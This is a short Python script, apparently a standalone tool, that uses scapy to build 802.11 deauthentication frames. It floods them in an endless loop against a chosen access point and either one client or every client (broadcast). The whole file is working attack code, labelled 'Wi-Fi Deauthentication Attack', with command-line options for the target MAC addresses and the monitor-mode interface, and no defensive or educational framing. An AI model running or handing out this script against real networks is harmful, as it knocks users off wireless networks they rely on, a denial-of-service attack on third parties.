from scapy.all import *
import argparse



def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Wi-Fi Deauthentication Attack",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "-a", "--access-point",
        dest="access_point",
        required=True,
        help="mac of the wifi-fi access point",
    )
    parser.add_argument(
        "-c", "--client",
        default="ff:ff:ff:ff:ff:ff",
        help="wi-fi client to be disconnected",
    )
    parser.add_argument(
        "-i", "--interface",
        default="wlan2",
        help="Monitor-mode wireless interface to sniff on",
    )
    return parser.parse_args()
    
    
def main():
    args = parse_args()
    packet = RadioTap()
    # Dot11(dst,src,bssid)
    if args.client == "ff:ff:ff:ff:ff:ff":
        # sent to client for disconnection
    	packet = packet / Dot11(addr1=args.client, addr2=args.access_point, addr3=args.access_point) / Dot11Deauth(reason=1)
    else:
        # sent to ap to disconnect client
    	packet = packet / Dot11(addr1=args.access_point, addr2=args.client, addr3=args.access_point) / Dot11Deauth(reason=3)
    sendp(packet, iface=args.interface, loop=1, inter=0.1, verbose=1)
    
if __name__ == "__main__":
    main()
    